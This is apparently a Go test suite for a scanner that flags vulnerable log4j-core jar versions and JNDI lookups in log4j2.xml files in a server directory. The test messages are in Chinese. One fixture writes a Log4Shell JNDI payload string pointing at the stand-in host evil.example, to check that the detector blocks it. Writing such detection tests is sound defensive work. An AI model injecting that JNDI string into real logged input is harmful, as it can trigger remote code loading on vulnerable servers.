package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func ljWrite(t *testing.T, dir, rel, body string) {
	t.Helper()
	path := filepath.Join(dir, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
}

func TestLog4jMissingDir(t *testing.T) {
	a := AuditServerLog4jShell(filepath.Join(t.TempDir(), "absent"))
	if a.Blocking() {
		t.Fatalf("不存在目录不应阻断: %s", a.Describe())
	}
}

func TestLog4jCleanNoComponents(t *testing.T) {
	dir := t.TempDir()
	a := AuditServerLog4jShell(dir)
	if a.Blocking() || a.Jars != 0 {
		t.Fatalf("空目录不应阻断: %s", a.Describe())
	}
}

func TestLog4jVulnerableCore(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "libraries/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar", "jar")
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("2.14.1 应阻断: %s", a.Describe())
	}
}

func TestLog4jFixedCore(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "libraries/org/apache/logging/log4j/log4j-core/2.17.1/log4j-core-2.17.1.jar", "jar")
	a := AuditServerLog4jShell(dir)
	if a.Blocking() {
		t.Fatalf("2.17.1 不应阻断: %s", a.Describe())
	}
}

func TestLog4jExactFixedVersion(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "plugins/log4j-core-2.17.0.jar", "jar")
	a := AuditServerLog4jShell(dir)
	if a.Blocking() {
		t.Fatalf("2.17.0 不应阻断: %s", a.Describe())
	}
}

func TestLog4jVulnerableInPlugins(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "plugins/log4j-core-2.10.0.jar", "jar")
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("插件目录 2.10.0 应阻断: %s", a.Describe())
	}
}

func TestLog4jVersionOne(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "plugins/log4j-core-1.2.17.jar", "jar")
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("log4j 1.x 应阻断: %s", a.Describe())
	}
}

func TestLog4jBadVersionName(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "plugins/log4j-core-abc.jar", "jar")
	a := AuditServerLog4jShell(dir)
	if a.Blocking() {
		t.Fatalf("无法解析版本不应阻断: %s", a.Describe())
	}
	if !a.HasWarnings() {
		t.Fatalf("应产生告警: %s", a.Describe())
	}
}

func TestLog4jJndiConfig(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "log4j2.xml", `<Configuration><Appenders><Lookup plugin="jndi" /></Appenders></Configuration>`+"\n"+`${jndi:ldap://evil.example/a}`)
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("JNDI 配置应阻断: %s", a.Describe())
	}
}

func TestLog4jLookupDeclaration(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "config/log4j2.xml", `<Configuration lookups="jndi"><Appenders/></Configuration>`)
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("显式 lookup 应阻断: %s", a.Describe())
	}
}

func TestLog4jPatternPlaceholder(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "log4j2.xml", `<Configuration>$${env:FOO}</Configuration>`)
	a := AuditServerLog4jShell(dir)
	if a.Blocking() {
		t.Fatalf("强制查找占位符不应阻断: %s", a.Describe())
	}
	if !a.HasWarnings() {
		t.Fatalf("应产生告警: %s", a.Describe())
	}
}

func TestLog4jBadConfigBody(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "log4j2.xml", "<hello/>")
	a := AuditServerLog4jShell(dir)
	if a.Blocking() {
		t.Fatalf("非 log4j 配置不应阻断: %s", a.Describe())
	}
	if a.Configs != 1 {
		t.Fatalf("配置计数应为 1: %d", a.Configs)
	}
}

func TestLog4jOversizedConfig(t *testing.T) {
	dir := t.TempDir()
	body := "<Configuration>" + strings.Repeat("# padding\n", 60000) + "</Configuration>"
	ljWrite(t, dir, "log4j2.xml", body)
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("超大配置应阻断: %s", a.Describe())
	}
}

func TestLog4jSymlinkJar(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "outside.jar")
	if err := os.WriteFile(target, []byte("jar"), 0o600); err != nil {
		t.Fatalf("write target: %v", err)
	}
	link := filepath.Join(dir, "plugins", "log4j-core-2.14.1.jar")
	if err := os.MkdirAll(filepath.Dir(link), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.Symlink(target, link); err != nil {
		t.Skipf("symlink unsupported: %v", err)
	}
	a := AuditServerLog4jShell(dir)
	if !a.Blocking() {
		t.Fatalf("符号链接 jar 应阻断: %s", a.Describe())
	}
}

func TestLog4jLongJarName(t *testing.T) {
	dir := t.TempDir()
	ljWrite(t, dir, "plugins/log4j-core-2.17.1-"+strings.Repeat("x", 120)+".jar", "jar")
	a := AuditServerLog4jShell(dir)
	if !a.HasWarnings() {
		t.Fatalf("超长文件名应告警: %s", a.Describe())
	}
}
